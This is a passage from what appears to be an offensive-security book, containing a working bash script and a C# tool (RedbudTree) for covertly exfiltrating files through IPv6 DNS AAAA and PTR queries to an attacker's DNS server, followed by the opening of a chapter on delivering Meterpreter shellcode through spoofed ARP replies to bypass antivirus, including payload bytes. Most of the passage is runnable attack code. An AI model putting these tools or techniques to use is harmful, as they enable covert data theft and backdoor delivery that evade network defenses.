IPv6Oct=0\n\r\n\r                counts=0\n\r\n\r        echo\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[!] [Exfil/Uploading DATA] via IPv6 DNS PTR Record Queries\"\n\r\n\r        echo \"[!] Sending DNS Lookup to DNS Server: \" $3\n\r\n\r        echo \"[!] Sending DNS Lookup by Delay (sec): \" $delaytime\n\r\n\r        tput setaf 2;        \n\r\n\r        echo\n\r\n\r                        for op in `xxd -p -c 1 $2`; do\n\r\n\r \n\r\n\r                        #echo \"[!] injecting this text via IPv6 octet:\" \"`echo $op | xxd -r -p`\" \" ==byte==&gt; \" $op \n\r\n\r \n\r\n\r                        if (($IPv6Oct == 0))\n\r\n\r                                then\n\r\n\r                                octets+=$op\n\r\n\r                                ((IPv6Oct++))\n\r\n\r                                elif (($IPv6Oct == 1)) \n\r\n\r                                then\n\r\n\r                                octets+=$op\":\"\n\r\n\r                                IPv6Oct=0                                \n\r\n\r                                #debug only\n\r\n\r                                #echo \"[!] injecting this text via IPv6 octet:\" \"`echo $octets | xxd -r -p`\" \" ==byte==&gt; \" $octets \n\r\n\r                                #debug only\n\r\n\r                        fi                        \n\r\n\r                        ((c++))\n\r\n\r                                if(($c == 12))\n\r\n\r                                then\n\r\n\r                                tput setaf 2;                                \n\r\n\r                                echo --------------------------\n\r\n\r                                tput setaf 3;                                \n\r\n\r                                echo \"[!] Your IPv6 is : \" $DefAddr:\"${octets::-1}\"\n\r\n\r                                Data=\"${octets::-1}\"\n\r\n\r                                tput setaf 6;\n\r\n\r                                echo \"[!] Your Text/Data for this IPv6 is : \" `echo $Data | xxd -r -p `\n\r\n\r                                #echo $DefAddr:\"${octets::-1}\":$RecordsIDcounter $4 &gt;&gt; TempDnsHost.txt\n\r\n\r                                time=`date \'+%d/%m/%y %H:%M:%S\'`\n\r\n\r                                tput setaf 9;\n\r\n\r                                echo \"[&gt;] [$counts] [$time] Sending Text/Data via Nslookup Done\"\n\r\n\r                                MyIPv6address=$DefAddr:\"${octets::-1}\"\n\r\n\r                                nslookup -type=aaaa $MyIPv6address $3 | grep arpa\n\r\n\r                                tput setaf 2;        \n\r\n\r                                ((counts++))\n\r\n\r                                sleep $delaytime\n\r\n\r                                tput setaf 9;\n\r\n\r                                octets=\"\"\n\r\n\r                                c=0\n\r\n\r                                ((RecordsIDcounter++))                                \n\r\n\r                                else\n\r\n\r                                tput setaf 9;\n\r\n\r                                fi\n\r\n\r                        \n\r\n\r                        if(($RecordsIDcounter == 9999))\n\r\n\r                                then\n\r\n\r                                echo \"[!] Oops Your IPv6 counter (z) was upper than 9999 : \" \"${octets::-1}\".$RecordsIDcounter\n\r\n\r                                break\n\r\n\r                        fi\n\r\n\r                        done\n\r\n\r                #########\n\r\n\r        \n\r\n\r        tput setaf 2;\n\r\n\r        echo\n\r\n\r        echo \"[!] Sending Done by ($counts) Request.\"\n\r\n\r        echo\n\r\n\r        tput setaf 9;\n\r\n\r        \n\r\n\r        fi\n\r\n\r \n\r\n\r        # download data via AAAA records queries\n\r\n\r        if [ $1 == \"-d\" ] \n\r\n\r        then\n\r\n\r \n\r\n\r        # Syntax : NativePayload_IP6DNS.sh -d getdata domain_name DnsMasq_IPv4\" (CLIENT SIDE \"B\")\n\r\n\r        if [ $2 == \"getdata\" ] \n\r\n\r        then\n\r\n\r \n\r\n\r        tput setaf 9;        \n\r\n\r        echo \"[!] Downloading Mode , Dump Text DATA via DNS IPv6 AAAA Records \"        \n\r\n\r        tput setaf 2;        \n\r\n\r        echo \"[!] Sending DNS A Records Queries for Domain :\" $3 \"to DNSMASQ-Server:\" $4\n\r\n\r        echo \"[!] to dump test.txt file via AAAA records you should use this syntax in server side:\"\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[!] Syntax : NativePayload_IP6DNS.sh -d makedns test.txt google.com\"        \n\r\n\r \n\r\n\r        # old ver : nslookup -type=aaaa google.com 127.0.0.1 | grep AAAA | awk {\'print $5\'}  | sort -t: -k 8 -n                \n\r\n\r        PayloadLookups=`nslookup -type=aaaa $3  $4 | grep  AAAA | awk {\'print $5\'} | sort -t: -k 8 -n`\n\r\n\r        \n\r\n\r        # new ver : for some versions of nslookup you need this syntax\n\r\n\r        if (( `echo ${#PayloadLookups}` == 0 )) \n\r\n\r        then\n\r\n\r        PayloadLookups=`nslookup -type=aaaa $3  $4 | grep  Address: | awk {\'print $2\'} | sort -t: -k 8 -n`\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[&gt;] Warning , Nslookup Result via [grep AAAA] was null , Sending request again via [grep Address:]\"\n\r\n\r        echo \"[!] Warning , it means Nslookup query sent (2) times\"                \n\r\n\r        fi\n\r\n\r \n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[&gt;] Dumped this Text via DNS AAAA Record Query:\"\n\r\n\r        echo\n\r\n\r        AAAARecordscounter=0\n\r\n\r \n\r\n\r                for op in $PayloadLookups; do\n\r\n\r                if [[ $op != *\"#53\"* ]];\n\r\n\r                then\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f3`\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f4`\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f5`\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f6`\n\r\n\r                Lookups+=`echo $op | cut -d\':\' -f7`\n\r\n\r                echo $Lookups | xxd -r -p \n\r\n\r                Lookups=\"\"\n\r\n\r                ((AAAARecordscounter++))                \n\r\n\r                fi\n\r\n\r                done\n\r\n\r \n\r\n\r                echo\n\r\n\r                echo\n\r\n\r                tput setaf 2;        \n\r\n\r                echo \"[!] Dumping Done , Performed by\" $((AAAARecordscounter)) \"DNS AAAA Records for domain :\" $3 \"from Server:\" $4\n\r\n\r                echo\n\r\n\r        fi\n\r\n\r \n\r\n\r        # Creating DNS Server and DNSHOST.TXT file (SERVER SIDE \"B\")\n\r\n\r        # NativePayload_IP6DNS.sh -d makedns text-file mydomain.com address fe80:1111\n\r\n\r        if [ $2 == \"makedns\" ] \n\r\n\r        then        \n\r\n\r                DefAddr=\"fe80:1111\"\n\r\n\r                if [ $5 == \"address\" ] \n\r\n\r                        then\n\r\n\r                        DefAddr=$6\n\r\n\r                        elif [ $5 == null ]\n\r\n\r                        then\n\r\n\r                        DefAddr=\"fe80:1111\"\n\r\n\r                fi\n\r\n\r                c=0                \n\r\n\r                octets=\"\"\n\r\n\r                tput setaf 9;\n\r\n\r                echo \" \" &gt; DnsHost.txt\n\r\n\r                echo \" \" &gt; TempDnsHost.txt\n\r\n\r                RecordsIDcounter=0\n\r\n\r                IPv6Oct=0\n\r\n\r \n\r\n\r                        for op in `xxd -p -c 1 $3`; do\n\r\n\r \n\r\n\r                        #echo \"[!] injecting this text via IPv6 octet:\" \"`echo $op | xxd -r -p`\" \" ==byte==&gt; \" $op \n\r\n\r \n\r\n\r                        if (($IPv6Oct == 0))\n\r\n\r                                then\n\r\n\r                                octets+=$op\n\r\n\r                                ((IPv6Oct++))\n\r\n\r                                elif (($IPv6Oct == 1)) \n\r\n\r                                then\n\r\n\r                                octets+=$op\":\"\n\r\n\r                                IPv6Oct=0                                \n\r\n\r                                # debug only        \n\r\n\r                                #echo \"[!] injecting this text via IPv6 octet:\" \"`echo $octets | xxd -r -p`\" \" ==byte==&gt; \" $octets\n\r\n\r                                # debug only\n\r\n\r                                \n\r\n\r                        fi                        \n\r\n\r                        ((c++))\n\r\n\r                                if(($c == 10))\n\r\n\r                                then\n\r\n\r                                tput setaf 9;\n\r\n\r                                \n\r\n\r                                echo \"[!] injecting this text via IPv6 Address (10bytes) :\" \"`echo $octets | xxd -r -p`\" \" ==byte==&gt; \" $octets                                \n\r\n\r                                tput setaf 3;                                \n\r\n\r                                echo \"[!] Your IPv6 is : \" $DefAddr:\"${octets::-1}\":$RecordsIDcounter\n\r\n\r                                Data=\"${octets::-1}\"\n\r\n\r                                echo \"[!] Your Text/Data for this IPv6 is : \" `echo $Data | xxd -r -p `\n\r\n\r                                echo -------------------------\n\r\n\r                                echo $DefAddr:\"${octets::-1}\":$RecordsIDcounter $4 &gt;&gt; TempDnsHost.txt\n\r\n\r                                tput setaf 9;\n\r\n\r                                octets=\"\"\n\r\n\r                                c=0\n\r\n\r                                ((RecordsIDcounter++))                                \n\r\n\r                                else\n\r\n\r                                tput setaf 9;\n\r\n\r                                fi\n\r\n\r                        \n\r\n\r                        if(($RecordsIDcounter == 9999))\n\r\n\r                                then\n\r\n\r                                echo \"[!] Oops Your IPv6 counter (z) was upper than 9999 : \" \"${octets::-1}\".$RecordsIDcounter\n\r\n\r                                break\n\r\n\r                        fi\n\r\n\r                        done\n\r\n\r \n\r\n\r                        echo\n\r\n\r                        tput setaf 2;\n\r\n\r                        echo \"[!] DnsHost.txt Created by\" $RecordsIDcounter \"AAAA Records for Domain:\" $4 \n\r\n\r                        echo \"[!] you can use this DNSHOST.TXT file via Dnsmasq tool\"\n\r\n\r                        tput setaf 2;\n\r\n\r                        echo \"[!] to dump these AAAA records you should use this syntax in client side:\"\n\r\n\r                        tput setaf 9;\n\r\n\r                        echo \"[!] Syntax : NativePayload_IP6DNS.sh -d getdata domain_name DnsMasq_IPv4\"\n\r\n\r                        echo\n\r\n\r                        echo \"[&gt;] DNSMASQ Started by DNSHOST.TXT File\"\n\r\n\r                        echo\n\r\n\r                        tput setaf 9;\n\r\n\r                        # sort by -k4 : wxyz:wxyz:xxxx:XXXX:x:x:x:z\n\r\n\r                        cat TempDnsHost.txt | sort -t: -k4 -n &gt; DnsHost.txt\n\r\n\r                        `dnsmasq --no-hosts --no-daemon --log-queries -H DnsHost.txt`\n\r\n\r                        tput setaf 9;\n\r\n\r \n\r\n\r \n\r\n\r        fi\n\r\n\r \n\r\n\r        fi        \n\r\n\r        \n\r\n\r        # make DNS Server for Dump DATA via DNS PTR Queries (Server Side \"A\")\n\r\n\r        # Reading Mode (log data via dnsmasq log files)\n\r\n\r        if [ $1 == \"-r\" ] \n\r\n\r        then\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[&gt;] Reading Mode , DNSMASQ Started by this log file : /var/log/dnsmasq.log !\" \n\r\n\r        tput setaf 2;\n\r\n\r        echo \"\" &gt; /var/log/dnsmasq.log                \n\r\n\r        `dnsmasq --no-hosts --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log` &amp;        \n\r\n\r        filename=\"/var/log/dnsmasq.log\"        \n\r\n\r        fs=$(stat -c%s \"$filename\")\n\r\n\r        count=0\n\r\n\r        while true; do\n\r\n\r                tput setaf 2;                \n\r\n\r                sleep 10\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                if [ \"$fs\" != \"$fs2\" ] ; \n\r\n\r                then\n\r\n\r                \n\r\n\r                tput setaf 6;\n\r\n\r                echo \"[!] /var/log/dnsmasq.log File has changed!\"                 \n\r\n\r                echo \"[!] Checking Queries\"\n\r\n\r                fs=$(stat -c%s \"$filename\")\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r \n\r\n\r                IP6PTRecordsTemp=`cat  $filename | grep PTR | awk {\'print $6\'} | tr -d \'.\'`                                \n\r\n\r                time=`date \'+%d/%m/%y %H:%M:%S\'`        \n\r\n\r                echo \"[!] [\"$time\"] Dump this Text via IPv6 PTR Queries\"\n\r\n\r                \n\r\n\r                tput setaf 9;\n\r\n\r                Dumptext=\"\"\n\r\n\r                for ops1 in `echo $IP6PTRecordsTemp`; do\n\r\n\r                \n\r\n\r                        IP6PTRecords=`echo \"${ops1::-15}\" | rev`\n\r\n\r                                        \n\r\n\r                        echo $IP6PTRecords | xxd -r -p\n\r\n\r                        Dumptext+=`echo $IP6PTRecords | xxd -r -p` \n\r\n\r                        done \n\r\n\r                echo\n\r\n\r                tput setaf 6;\n\r\n\r                echo \"[&gt;] this Text Saved to ExfilDump.txt\"\n\r\n\r                echo $Dumptext &gt; ExfilDump.txt\n\r\n\r                tput setaf 2;\n\r\n\r                else\n\r\n\r                fs=$(stat -c%s \"$filename\")\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                tput setaf 2;\n\r\n\r                fi\n\r\n\r        done\n\r\n\r        fi\n\r\n\r \n\r\n\r \n\r\n\rRedbudTree.cs :\n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Net;\n\r\n\rusing System.Net.Sockets;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace RedbudTree\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        /// &lt;summary&gt;\n\r\n\r        /// RedbudTree v1.0 , IPv6 DNS Request Listener (UDP Port 53)\n\r\n\r        /// Detecting Exfiltration DATA via IPv6 DNS AAAA Record Requests\n\r\n\r        /// \n\r\n\r        /// DNS IPv6 Requests tested by nslookup command in Win2008 R2 and Kali linux.\n\r\n\r        /// RedbudTree Listener Mode tested in Win2008 R2 + .NET Framework 2.0\n\r\n\r        /// \n\r\n\r        /// for using \"Listener Mode\" UDP Port 53 should be opened before using this tool.         \n\r\n\r        /// windows command for opening UDP port 53 is :  \n\r\n\r        /// netsh advfirewall firewall add rule name=\"UDP 53\" dir=in action=allow protocol=UDP localport=53\n\r\n\r        /// \n\r\n\r        /// [!] Syntax 1: Creating Exfiltration DATA via IPv6 Address and Nslookup\n\r\n\r        /// [!] Syntax 1: RedbudTree.exe \"AAAA\" \"Text\"\n\r\n\r        /// [!] Example1: RedbudTree.exe AAAA \"this is my test\"\n\r\n\r        /// \n\r\n\r        /// [!] Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files\n\r\n\r        /// [!] Syntax 2: RedbudTree.exe \"AAAA\" \"FILE\" \"TextFile.txt\"\n\r\n\r        /// [!] Example2: RedbudTree.exe AAAA FILE \"TextFile.txt\"\n\r\n\r        /// \n\r\n\r        /// [!] Syntax 3: RedbudTree with Listening Mode\n\r\n\r        /// [!] Syntax 3: RedbudTree.exe        \n\r\n\r        /// \n\r\n\r        /// &lt;/summary&gt;\n\r\n\r \n\r\n\r \n\r\n\r        public static int counter = 0;\n\r\n\r        public static UdpClient UDP_53_Init = new UdpClient(53);\n\r\n\r \n\r\n\r        public static void Async_UDP_Data_Receive(IAsyncResult AsyncResult)\n\r\n\r        {                     \n\r\n\r            IPEndPoint LocalIP_UdpPort53 = new IPEndPoint(IPAddress.Any,53);\n\r\n\r            byte[] UDP_Rec_Bytes = UDP_53_Init.EndReceive(AsyncResult, ref LocalIP_UdpPort53);            \n\r\n\r                      \n\r\n\r            bool isIPV6 = false;           \n\r\n\r            string UDP_DATA = Encoding.ASCII.GetString(UDP_Rec_Bytes);\n\r\n\r            if (UDP_DATA.ToUpper().Contains(\"IP6\"))\n\r\n\r            {\n\r\n\r                isIPV6 = true;\n\r\n\r                counter++;\n\r\n\r                Console.WriteLine(\"[{1}] [{0}] IPv6 DNS Request Received : \", DateTime.Now.ToString(),counter.ToString());\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                /// Debug Mode\n\r\n\r                //Console.WriteLine(BitConverter.ToString(bytes));               \n\r\n\r            }\n\r\n\r            if (isIPV6)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.Write(\"[{0}] IPv6 DNS Bytes is :  \", DateTime.Now.ToString());\n\r\n\r \n\r\n\r                char[] Temp = new char[UDP_DATA.Length];\n\r\n\r                int c = 0;                \n\r\n\r                foreach (char item in UDP_DATA)\n\r\n\r                {\n\r\n\r                    if (Convert.ToInt32(item) &gt; 16)\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                        Console.Write(item);\n\r\n\r                        Temp[c] = item;                        \n\r\n\r                    }\n\r\n\r                    else\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                        Console.Write(item);\n\r\n\r                    }\n\r\n\r                    c++;\n\r\n\r                }\n\r\n\r                int cc = Temp.Length;\n\r\n\r                bool init = false;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.Write(\"[{0}] IPv6 DNS Request is : \", DateTime.Now.ToString());\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                string _Raw = \"\";\n\r\n\r                int BreakTime = 0;\n\r\n\r                for (int jj = cc - 1; jj &gt;= 0; jj--)\n\r\n\r                {\n\r\n\r                    if (init)\n\r\n\r                    {                        \n\r\n\r                        Console.Write(Temp[jj]);\n\r\n\r                        if (Temp[jj] != \'\\0\') _Raw += Temp[jj];\n\r\n\r                    }\n\r\n\r                    if (Temp[jj] == \'i\') init = true;                   \n\r\n\r                    if (BreakTime &gt; 75) break;\n\r\n\r                    BreakTime++;\n\r\n\r                }\n\r\n\r                \n\r\n\r                /// Debug\n\r\n\r                //Console.WriteLine(\"\\n\" + _Raw);\n\r\n\r \n\r\n\r                byte[] RAW = new byte[16];\n\r\n\r                int kk = 0;\n\r\n\r                for (int k = 0; k &lt; _Raw.Length / 2;)\n\r\n\r                {\n\r\n\r                    RAW[k] = byte.Parse(_Raw.Substring(kk, 2), System.Globalization.NumberStyles.HexNumber);\n\r\n\r                    k++;\n\r\n\r                    kk++;\n\r\n\r                    kk++;\n\r\n\r                }\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.Write(\"[{0}] Dumping DATA from this IPv6 Address :\", DateTime.Now.ToString());\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                Console.Write(UTF8Encoding.ASCII.GetChars(RAW));\n\r\n\r                Console.WriteLine();                \n\r\n\r            }           \n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;         \n\r\n\r        }\n\r\n\r        public static void Create_IPv6_Address(string input_Exfil_String_DATA ,bool _isFile)\n\r\n\r        {\n\r\n\r           \n\r\n\r            try\n\r\n\r            {\n\r\n\r                string ExfiltrationText = \"\";\n\r\n\r                Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                Console.WriteLine(\"Your Target (UDP Port 53) Listener IPv4 Address is 192.168.56.101 you can change it manually.\");\n\r\n\r \n\r\n\r                if (_isFile)\n\r\n\r                {\n\r\n\r                    Console.WriteLine(\"Your Exfiltration Nslookup Commands for File \\\"{0}\\\" are:\", input_Exfil_String_DATA);\n\r\n\r                    byte[] FileBytes = System.IO.File.ReadAllBytes(input_Exfil_String_DATA);\n\r\n\r                    ExfiltrationText = UTF8Encoding.ASCII.GetString(FileBytes);\n\r\n\r                }\n\r\n\r                if(!_isFile)\n\r\n\r                {\n\r\n\r                    Console.WriteLine(\"Your Exfiltration Nslookup Commands are:\");\n\r\n\r                    byte[] TextBytes = UnicodeEncoding.ASCII.GetBytes(input_Exfil_String_DATA);\n\r\n\r                    ExfiltrationText = UTF8Encoding.ASCII.GetString(TextBytes);\n\r\n\r                }\n\r\n\r \n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();              \n\r\n\r                byte[] b = new byte[ExfiltrationText.Length];\n\r\n\r                int i = 0;\n\r\n\r                int c = 1;\n\r\n\r                int cc = 1;\n\r\n\r                Console.Write(\"nslookup -type=aaaa \");\n\r\n\r                foreach (char item in ExfiltrationText)\n\r\n\r                {\n\r\n\r                    b[i] = Convert.ToByte(item);\n\r\n\r \n\r\n\r                    if (cc &gt; 2) { Console.Write(\":\"); cc = 1; }\n\r\n\r                    Console.Write(string.Format(\"{0:x2}\", b[i]));\n\r\n\r                    if (c == 16)\n\r\n\r                    {\n\r\n\r                        Console.Write(\" 192.168.56.101 | find \\\"\\\"\");\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.Write(\"nslookup -type=aaaa \");\n\r\n\r                        c = 0;\n\r\n\r                        cc = 0;\n\r\n\r                    }\n\r\n\r \n\r\n\r                    i++;\n\r\n\r                    c++;\n\r\n\r                    cc++;\n\r\n\r                }\n\r\n\r \n\r\n\r                Console.WriteLine();\n\r\n\r            }\n\r\n\r            catch (Exception omg)\n\r\n\r            {\n\r\n\r                Console.WriteLine(omg.Message);\n\r\n\r            }\n\r\n\r        }\n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            /// Exfiltration and uploading DATA by Sending IPv6 DNS Request to Attacker DNS Server \n\r\n\r            /// in this case you can Uploading DATA by IPv6 Addresses      \n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine(\"RedbudTree , IPv6 DNS Request Listener (UDP Port 53)\");\n\r\n\r            Console.WriteLine(\"Detecting Exfiltration DATA via IPv6 DNS AAAA Record Requests\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher Oct-Nov 2017\");\n\r\n\r            Console.WriteLine();\n\r\n\r            if (args.Length &gt;= 1 &amp;&amp; args[0].ToUpper() == \"HELP\")\n\r\n\r            {\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 1: Creating Exfiltration DATA via IPv6 Address and Nslookup\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 1: RedbudTree.exe \\\"AAAA\\\" \\\"Text\\\"\");\n\r\n\r                Console.WriteLine(\"[!] Example1: RedbudTree.exe AAAA \\\"this is my test\\\"\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 2: RedbudTree.exe \\\"AAAA\\\" \\\"FILE\\\" \\\"TextFile.txt\\\"\");\n\r\n\r                Console.WriteLine(\"[!] Example2: RedbudTree.exe AAAA FILE \\\"TextFile.txt\\\"\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 3: Listening Mode\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 3: RedbudTree.exe \");\n\r\n\r                Console.WriteLine(\"[!] Example3: RedbudTree.exe \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            }\n\r\n\r            else if (args.Length == 2 &amp;&amp; args[0].ToUpper() == \"AAAA\")\n\r\n\r            {\n\r\n\r                try\n\r\n\r                {\n\r\n\r                    Create_IPv6_Address(args[1], false);\n\r\n\r                    Console.WriteLine();\n\r\n\r                }\n\r\n\r                catch (Exception omg)\n\r\n\r                {\n\r\n\r                    Console.WriteLine(omg.Message);\n\r\n\r                }\n\r\n\r            }\n\r\n\r            else if (args.Length == 3 &amp;&amp; args[0].ToUpper() == \"AAAA\" &amp;&amp; args[1].ToUpper() == \"FILE\")\n\r\n\r            {\n\r\n\r                try\n\r\n\r                {\n\r\n\r                    Create_IPv6_Address(args[2], true);\n\r\n\r                    Console.WriteLine();\n\r\n\r                }\n\r\n\r                catch (Exception omg)\n\r\n\r                {\n\r\n\r                    Console.WriteLine(omg.Message);\n\r\n\r                }\n\r\n\r            }\n\r\n\r            else if (args.Length == 0)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                Console.WriteLine(\"[!] UDP Port 53 Listening Mode\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                while (true)\n\r\n\r                {\n\r\n\r                    try\n\r\n\r                    {\n\r\n\r                        UDP_53_Init.BeginReceive(Async_UDP_Data_Receive, new object());\n\r\n\r                        System.Threading.Thread.Sleep(1000);\n\r\n\r                    }\n\r\n\r                    catch (Exception omg)\n\r\n\r                    {\n\r\n\r                        Console.WriteLine(\"[!] Maybe you need to this command before Running RedBudTree \\\"Listening Mode\\\" :\");\n\r\n\r                        Console.WriteLine(\"[!] netsh advfirewall firewall add rule name=\\\"UDP 53\\\" dir=in action=allow protocol=UDP localport=53\");\n\r\n\r                        Console.WriteLine(\"[X] \" + omg.Message);\n\r\n\r                    }\n\r\n\r                }\n\r\n\r            }\n\r\n\r            else\n\r\n\r            {\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 1: Creating Exfiltration DATA via IPv6 Address and Nslookup\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 1: RedbudTree.exe \\\"AAAA\\\" \\\"Text\\\"\");\n\r\n\r                Console.WriteLine(\"[!] Example1: RedbudTree.exe AAAA \\\"this is my test\\\"\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 2: Creating Exfiltration DATA via IPv6 Address and Nslookup by Text Files\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 2: RedbudTree.exe \\\"AAAA\\\" \\\"FILE\\\" \\\"TextFile.txt\\\"\");\n\r\n\r                Console.WriteLine(\"[!] Example2: RedbudTree.exe AAAA FILE \\\"TextFile.txt\\\"\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 3: Listening Mode\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 3: RedbudTree.exe \");\n\r\n\r                Console.WriteLine(\"[!] Example3: RedbudTree.exe \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            }\n\r\n\r        }\n\r\n\r    }\n\r\n\r}\n\r\n\r ","","topics\\Chapter 7.html","\n\r\n\rTransferring Backdoor Payloads by ARP Traffic\n\r\n\r \n\r\n\rUnderstanding this method : Transfer Backdoor Payloads by ARP Traffic and bypassing AVs\n\r\n\rAfter Previous Chapters about DNS Traffic now I want to explain how you can do this with ARP traffic in your network, and I want to tell you : “the most Anti Viruses can’t detect this one” \n\r\n\rBefore I explain this technique, I want to show you how ARP traffic works in your network. \n\r\n\rPicture 1: ARP traffic step by step\n\r\n\rAs you can see in picture 1 in (ARP, Step1) :\n\r\n\rSystem A sent one Broadcast to all workstations = who is IP_Address for example (192.168.1.5) I want your MAC?\n\r\n\rIn step2 system B responded to that broadcast traffic with one Packet Directly. I AM 192.168.1.5 and This is my MAC ADDRESS.\n\r\n\rThis (step2) is my “Important Point” for this Technique for transferring payloads via ARP Traffic.\n\r\n\rStep3 doesn’t matter for this technique!\n\r\n\rWhy?\n\r\n\rBecause an attacker can transfer their bytes via MAC_Address and this is another highway for hackers and Malware/Viruses to transferring payload bytes silently over a network. This technique is very slow more often, but sometimes this is a good advantage for hackers, trust me ;) And it is not important how much time you need for the established connection with this technique because your servers or clients always is up in your network 24 Hours / every day (especially servers).\n\r\n\rIn this technique an attacker need two computers, but you can do it with one system only, but I want to explain this method with two systems on the attacker side. First system is linux and second is Win7-SP1 (macchanger system) on the attacker side.\n\r\n\rAnd on the target side your System is Win7-SP1 too , so we have 3 systems.\n\r\n\rWith this technique, the backdoor does something like system A in Picture 1 and finally the backdoor can get payload bytes from the hacker system (macchanger system) with ARP traffic, in this case my backdoor try to download a meterpreter payload in ARP Traffic also with this method you can have DATA Infiltration/Exfiltration too .\n\r\n\rAlso you can see in this Chapter: I will get a Meterpreter session‍ from (192.168.1.113 --&gt; to --&gt; Kali 192.168.1.50) after 38 Minutes transferring Payloads between IP: 192.168.1.113 (backdoor system) and IP: 192.168.1.5 (macchanger system) with the ARP Traffic  also about DATA Exfiltration I will talk in this chapter via NativePayload_ARP.sh script (Linux only). \n\r\n\rPicture 2: Attack by ARP Traffic steps\n\r\n\rThis technique is not fast at least on Windows , but it is possible.\n\r\n\rwe have some problems for this technique.\n\r\n\rWhere are the problems?\n\r\n\rBefore I explain where the problems are, first let me show you how my code works with a simple example: \n\r\n\rPicture 3: BAT file in (macchanger system) for reply Fake MacAddress by injecting Payloads to MAC\n\r\n\rInjecting Payload bytes as MAC ADDRESSES :\n\r\n\rAs you can see in picture 3 in line 1 we have one MACAddress: 00fc4883e4f0\n\r\n\rThis Mac_Address has 2 sections. The first section is 00 , and the second section is fc4883e4f0 .\n\r\n\rSection two is first bytes of First Line for Meterpreter Payload. This is not a MACAddress but you can use that as mac address via ARP traffic‍ too.\n\r\n\rWith My tool “Payload_to_Mac.exe” you can set and Change NIC Network interface connection MAC very simply.\n\r\n\rThis tool works like macchanger in Linux .\n\r\n\rIn line 1 with this tool you can set MAC Address : 00fc4883e4f0 for “Local Area Connection”\n\r\n\rWhy do this?\n\r\n\rbecause i want to send Response with this Injected MAC address to an ARP Request‍.\n\r\n\rSo we have something like this :\n\r\n\r\n\r•local Area connection is (Macchanger system)  \n\r\n\r\n\r•infected system is (backdoor system)  \n\r \n\r\n\rPicture 4:\n\r\n\rOk from these 3 responses we can dump these bytes of payload:\n\r\n\r{ fc4883e4f0 + e8cc000000 + 4151415052 } == fc4883e4f0e8cc0000004151415052\n\r\n\rInfected System (backdoor) ipaddress is 192.168.1.113 and win7-sp1 for attacker NIC 